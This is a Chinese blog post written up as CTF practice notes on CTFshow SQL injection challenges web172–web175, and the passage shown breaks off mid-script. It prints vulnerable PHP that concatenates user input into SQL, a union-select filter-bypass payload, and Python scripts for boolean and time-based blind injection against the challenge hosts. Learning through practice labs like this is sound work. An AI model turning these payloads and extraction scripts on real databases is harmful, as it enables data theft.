<!DOCTYPE HTML>
<html lang="zh-CN">
    


<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="keywords" content="CTFshow之web(四), Yn8rt 计算机 网络安全">
    <meta name="baidu-site-verification" content="fmlEuI34ir">
    <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
    <meta name="google-site-verification" content="pBWoGvVEP36FzzS4xIpoMejc5UKi3RKcxd9rWWcjiDg">
    <meta name="360-site-verification" content="2db45fc772bbd3e7efd0985eec0fff97">
    <meta name="description" content="前言今天是2021/7/25，正式进入sql注入专题，目标：加强python的学习，达到通过写python脚本，加快注入速度的程度，掌握sql在php编程中的一系列查询语句。
新手区可以看看Y4师傅以前记录的小笔记SQL注入之MySQL注入">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="baidu-site-verification" content="wvlc3L96QK">
    <title>CTFshow之web(四) | Yn8rt</title>
    <link rel="icon" type="image/png" href="http://images2.5666888.xyz//logo.png">

    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/materialize/1.0.0/css/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/animate.css/3.5.1/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.11/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    
    <style type="text/css">
        
            
            code[class*="language-"],
            pre[class*="language-"] {
                white-space: pre !important;
            }

        
    </style>

    <script src="https://cdn.bootcss.com/jquery/2.2.0/jquery.min.js"></script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

    
    
        <script>
            (function(){
                var bp = document.createElement('script');
                var curProtocol = window.location.protocol.split(':')[0];
                if (curProtocol === 'https') {
                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
                }
                else {
                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                }
                var s = document.getElementsByTagName("script")[0];
                s.parentNode.insertBefore(bp, s);
            })();
        </script>
    

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>



    <body>
	<div class="stars-con">
			<div id="stars"></div>
			<div id="stars2"></div>
			<div id="stars3"></div>
		  </div>
        <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="http://images2.5666888.xyz//logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Yn8rt</span>
                </a>
            </div>
            


<!-- <a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>首页</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>归档</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="" class="waves-effect waves-light">
            
            <i class="fa fa-heartbeat"></i>
            
            <span>清单</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>关于我</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/contact" class="waves-effect waves-light">
            
            <i class="fa fa-envelope"></i>
            
            <span>留言板</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tools" class="waves-effect waves-light">
            
            <i class="fa fa-suitcase"></i>
            
            <span>快捷导航</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/friends" class="waves-effect waves-light">
            
            <i class="fa fa-address-book"></i>
            
            <span>友情链接</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/GoogleHacking/" class="waves-effect waves-light">
            
            <i class="fa fa-google"></i>
            
            <span>Hacking</span>
        </a>
    </li>
    
    <li>
        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
        </a>
    </li>
</ul> -->

<!-- 支持二级菜单特性  -->
<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right nav-menu">
    
      <li class="hide-on-med-and-down nav-item" >

        
            <a href="/" class="waves-effect waves-light">
              
                <i class="fa fa-home"></i>
              
              <span>首页</span>
            </a>

            
      </li>
    
      <li class="hide-on-med-and-down nav-item" >

        
              <a href="" class="waves-effect waves-light">
                
                  <i class="fa fa-archive"></i>
                
                <span>归档</span>
                <i class="fa fa-chevron-down" aria-hidden="true"></i>
              </a>

            <ul class="sub-nav menus_item_child ">
              
                <li> 
                  <a href="/archives" >
                    
                      <i class="fa fa-paper-plane" style="margin-top: -20px;"></i>
                    
                    <span>时轴</span>
                  </a>
                </li>
              
                <li> 
                  <a href="/categories" >
                    
                      <i class="fa fa-bookmark" style="margin-top: -20px;"></i>
                    
                    <span>分类</span>
                  </a>
                </li>
              
                <li> 
                  <a href="/tags" >
                    
                      <i class="fa fa-tags" style="margin-top: -20px;"></i>
                    
                    <span>标签</span>
                  </a>
                </li>
               
            </ul>
          
      </li>
    
      <li class="hide-on-med-and-down nav-item" >

        
              <a href="" class="waves-effect waves-light">
                
                  <i class="fa fa-heartbeat"></i>
                
                <span>清单</span>
                <i class="fa fa-chevron-down" aria-hidden="true"></i>
              </a>

            <ul class="sub-nav menus_item_child ">
              
                <li> 
                  <a href="/List/music" >
                    
                      <i class="fa fa-music" style="margin-top: -20px;"></i>
                    
                    <span>音乐</span>
                  </a>
                </li>
              
                <li> 
                  <a href="/List/movies" >
                    
                      <i class="fa fa-film" style="margin-top: -20px;"></i>
                    
                    <span>视频</span>
                  </a>
                </li>
              
                <li> 
                  <a href="/List" >
                    
                      <i class="fa fa-coffee" style="margin-top: -20px;"></i>
                    
                    <span>休闲</span>
                  </a>
                </li>
               
            </ul>
          
      </li>
    
      <li class="hide-on-med-and-down nav-item" >

        
            <a href="/about" class="waves-effect waves-light">
              
                <i class="fa fa-user-circle-o"></i>
              
              <span>关于我</span>
            </a>

            
      </li>
    
      <li class="hide-on-med-and-down nav-item" >

        
            <a href="/contact" class="waves-effect waves-light">
              
                <i class="fa fa-envelope"></i>
              
              <span>留言板</span>
            </a>

            
      </li>
    
      <li class="hide-on-med-and-down nav-item" >

        
            <a href="/tools" class="waves-effect waves-light">
              
                <i class="fa fa-suitcase"></i>
              
              <span>快捷导航</span>
            </a>

            
      </li>
    
      <li class="hide-on-med-and-down nav-item" >

        
            <a href="/friends" class="waves-effect waves-light">
              
                <i class="fa fa-address-book"></i>
              
              <span>友情链接</span>
            </a>

            
      </li>
    
      <li class="hide-on-med-and-down nav-item" >

        
            <a href="/GoogleHacking/" class="waves-effect waves-light">
              
                <i class="fa fa-google"></i>
              
              <span>Hacking</span>
            </a>

            
      </li>
    

    <li>
        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
        </a>
    </li>

</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="http://images2.5666888.xyz//logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Yn8rt</div>
        <div class="logo-desc">
            
            山司 | 信息安全专业 | 星盟天汉安全团队
            
        </div>
    </div>

    
<!-- 支持一级菜单特性 -->
<!--    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                首页
            </a>
        </li>
        
        <li>
            <a href="" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                归档
            </a>
        </li>
        
        <li>
            <a href="" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-heartbeat"></i>
                
                清单
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                关于我
            </a>
        </li>
        
        <li>
            <a href="/contact" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-envelope"></i>
                
                留言板
            </a>
        </li>
        
        <li>
            <a href="/tools" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-suitcase"></i>
                
                快捷导航
            </a>
        </li>
        
        <li>
            <a href="/friends" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-address-book"></i>
                
                友情链接
            </a>
        </li>
        
        <li>
            <a href="/GoogleHacking/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-google"></i>
                
                Hacking
            </a>
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/iceberg404" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul> -->

   
   
<!-- 支持二级菜单特性  -->
 <ul class="menu-list mobile-menu-list">
    
        <li class="m-nav-item">
                
                    <a href="/" class="waves-effect waves-light">
                        
                        <i class="fa fa-fw fa-home"></i>
                        
                        首页
                    </a>
              
            </li>
        
        <li class="m-nav-item">
                
                    <a href="javascript:;">
                            
                            <i class="fa fa-fw fa-archive"></i>
                            
                            归档
                            <span class="m-icon"><i class="fa fa-chevron-right"></i></span>
                    </a>
                <ul>
                  
                    <li> 
                      <a href="/archives" >
                           
                            <i class="fa fa-paper-plane" style="left: 18px; position: absolute;"></i>
                       
                       <span>时轴</span>
                      </a>
                    </li>
                  
                    <li> 
                      <a href="/categories" >
                           
                            <i class="fa fa-bookmark" style="left: 18px; position: absolute;"></i>
                       
                       <span>分类</span>
                      </a>
                    </li>
                  
                    <li> 
                      <a href="/tags" >
                           
                            <i class="fa fa-tags" style="left: 18px; position: absolute;"></i>
                       
                       <span>标签</span>
                      </a>
                    </li>
                   
                </ul>
              
            </li>
        
        <li class="m-nav-item">
                
                    <a href="javascript:;">
                            
                            <i class="fa fa-fw fa-heartbeat"></i>
                            
                            清单
                            <span class="m-icon"><i class="fa fa-chevron-right"></i></span>
                    </a>
                <ul>
                  
                    <li> 
                      <a href="/List/music" >
                           
                            <i class="fa fa-music" style="left: 18px; position: absolute;"></i>
                       
                       <span>音乐</span>
                      </a>
                    </li>
                  
                    <li> 
                      <a href="/List/movies" >
                           
                            <i class="fa fa-film" style="left: 18px; position: absolute;"></i>
                       
                       <span>视频</span>
                      </a>
                    </li>
                  
                    <li> 
                      <a href="/List" >
                           
                            <i class="fa fa-coffee" style="left: 18px; position: absolute;"></i>
                       
                       <span>休闲</span>
                      </a>
                    </li>
                   
                </ul>
              
            </li>
        
        <li class="m-nav-item">
                
                    <a href="/about" class="waves-effect waves-light">
                        
                        <i class="fa fa-fw fa-user-circle-o"></i>
                        
                        关于我
                    </a>
              
            </li>
        
        <li class="m-nav-item">
                
                    <a href="/contact" class="waves-effect waves-light">
                        
                        <i class="fa fa-fw fa-envelope"></i>
                        
                        留言板
                    </a>
              
            </li>
        
        <li class="m-nav-item">
                
                    <a href="/tools" class="waves-effect waves-light">
                        
                        <i class="fa fa-fw fa-suitcase"></i>
                        
                        快捷导航
                    </a>
              
            </li>
        
        <li class="m-nav-item">
                
                    <a href="/friends" class="waves-effect waves-light">
                        
                        <i class="fa fa-fw fa-address-book"></i>
                        
                        友情链接
                    </a>
              
            </li>
        
        <li class="m-nav-item">
                
                    <a href="/GoogleHacking/" class="waves-effect waves-light">
                        
                        <i class="fa fa-fw fa-google"></i>
                        
                        Hacking
                    </a>
              
            </li>
        

        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/iceberg404" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul> 

</div>

        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/iceberg404" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

        
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/14.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        CTFshow之web(四)
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.bootcss.com/tocbot/4.8.1/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        padding-left: 20px;
        width: 345px;
        background-color: rgb(255, 255, 255,0.7);
        border-radius: 10px;
        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        margin-bottom: 20px;
    }
    
    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 20px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        
<!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/sql注入/" target="_blank">
                                <span class="chip bg-color">sql注入</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fa fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTFshow/" class="post-category" target="_blank">
                                CTFshow
                            </a>
                        
                    </div>
                    
                </div>
            </div>
            
            <div class="post-info">
                <div class="post-date info-break-policy">
                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-07-24
                </div>

                <div class="post-author info-break-policy">
                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
                    
                        杨大炮
                    
                </div>

                
                    
                    <div class="info-break-policy">
                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
                        7.5k
                    </div>
                    

                    
                    <div class="info-break-policy">
                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
                        36 分
                    </div>
                    
                
                
                
                        <span id="busuanzi_container_site_pv" style='display:none'></span>
                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv" ></span>
    
                

            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天是2021/7/25，正式进入sql注入专题，目标：加强python的学习，达到通过写python脚本，加快注入速度的程度，掌握sql在php编程中的一系列查询语句。</p>
<h1 id="新手区"><a href="#新手区" class="headerlink" title="新手区"></a>新手区</h1><p>可以看看Y4师傅以前记录的小笔记<br><a href="https://blog.csdn.net/solitudi/article/details/106820588?ops_request_misc=%7B%22request%5Fid%22%3A%22160630921119725271050515%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=160630921119725271050515&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-4-106820588.pc_v2_rank_blog_default&utm_term=注入&spm=1018.2118.3001.4450" target="_blank" rel="noopener">SQL注入之MySQL注入的学习笔记(一)</a><br><a href="https://blog.csdn.net/solitudi/article/details/106824456?ops_request_misc=%7B%22request%5Fid%22%3A%22160630921119725271050515%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=160630921119725271050515&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-2-106824456.pc_v2_rank_blog_default&utm_term=注入&spm=1018.2118.3001.4450" target="_blank" rel="noopener">SQL注入之MySQL注入学习笔记(二)</a></p>
<h1 id="2021-7-25"><a href="#2021-7-25" class="headerlink" title="2021-7-25"></a>2021-7-25</h1><h1 id="web172、web173——hex-、to-base64"><a href="#web172、web173——hex-、to-base64" class="headerlink" title="web172、web173——hex() 、to_base64()"></a>web172、web173——<code>hex() 、to_base64()</code></h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from ctfshow_user2 where username !='flag' and id = '"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//检查结果是否有flag</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">!==</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'查询成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>意思大概就是把flag从查询中给ban掉了</p>
<p><strong>解决方法</strong></p>
<p>利用编码解决：base64、hex</p>
<p>这里针对的是<code>id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;</code>，双引号是包括在内的，可能只是起解析作用</p>
<p><strong>payload</strong></p>
<p><code>yn8&#39;union select to_base64(username),hex(password) from ctfshow_user2+--+</code></p>
<p><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制在线</a></p>
<h1 id="web174——盲注"><a href="#web174——盲注" class="headerlink" title="web174——盲注"></a>web174——盲注</h1><p><strong>查询语句一样(不贴了，占地方)</strong></p>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//检查结果是否有flag</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'查询成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><a href="https://www.runoob.com/php/php-json.html" target="_blank" rel="noopener">PHP JSON</a></p>
<p>也就是说返回的结果是不能有flag和任何数字</p>
<p><strong>解决方案</strong></p>
<p>采取盲注并利用二分法来判断</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># @Author  : Yn8rt</span>
<span class="token comment" spellcheck="true"># @Time    : 2021/7/25 17:17</span>
<span class="token comment" spellcheck="true"># @Function:</span>
<span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://cece2e87-a82b-4be3-9a5d-fd78f587916e.challenge.ctf.show:8080/api/v4.php"</span>
flag <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 创建一个整数列表</span>
    max <span class="token operator">=</span> <span class="token number">128</span>  <span class="token comment" spellcheck="true"># ASCII可见字符</span>
    min <span class="token operator">=</span> <span class="token number">32</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        mid <span class="token operator">=</span> min<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>max<span class="token operator">-</span>min<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 取整除 - 向下取接近商的整数</span>
        <span class="token keyword">if</span> min<span class="token operator">==</span>mid<span class="token punctuation">:</span>
            flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        payload<span class="token operator">=</span><span class="token string">"?id=' union select 'a',"</span> \
                <span class="token string">"if(ascii(substr((select group_concat(password) "</span> \
                <span class="token string">"from ctfshow_user4 where username='flag'),%d,1))&lt;%d,"</span> \
                <span class="token string">"'small','da')+--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token comment" spellcheck="true">#print(res)</span>
        <span class="token keyword">if</span> <span class="token string">"small"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>
            max <span class="token operator">=</span> mid
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            min <span class="token operator">=</span> mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="2021-7-26"><a href="#2021-7-26" class="headerlink" title="2021-7-26"></a>2021-7-26</h1><h1 id="web175——时间盲注"><a href="#web175——时间盲注" class="headerlink" title="web175——时间盲注"></a>web175——时间盲注</h1><p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//检查结果是否有flag</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'查询成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>检测\x00-\x7f也就是0-127，所以普通的盲注是不行了</p>
<p>时间盲注测试语句：<code>1&#39;and if(1=1,sleep(2),0)+--+</code>可以</p>
<p><a href="https://zhuanlan.zhihu.com/p/46815128" target="_blank" rel="noopener">Python 3 字符串前 加 u、r、b 、f的含义</a></p>
<p><a href="https://www.cnblogs.com/Neeo/articles/10536202.html" target="_blank" rel="noopener">一篇读懂Python中的位运算</a></p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>嫁接y4的脚本，比较好理解</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://6cd84f2d-be07-46cc-bc8e-90b6ff57f72a.challenge.ctf.show:8080/api/v5.php?id=1' and "</span>

result <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment" spellcheck="true"># payload = f'1=if(ascii(substr(database(),{i},1))>{mid},sleep(2),0)+--+'</span>
        <span class="token comment" spellcheck="true"># payload = f'1=if(ascii(substr((select table_name from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep(2),0)+--+'</span>
        <span class="token comment" spellcheck="true"># payload = f'1=if(ascii(substr((select column_name from information_schema.columns where table_name='ctfshow_user5'),{i},1))>{mid},sleep(2),0)+--+'</span>
        payload <span class="token operator">=</span> f<span class="token string">'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))>{mid},sleep(2),0)+--+'</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
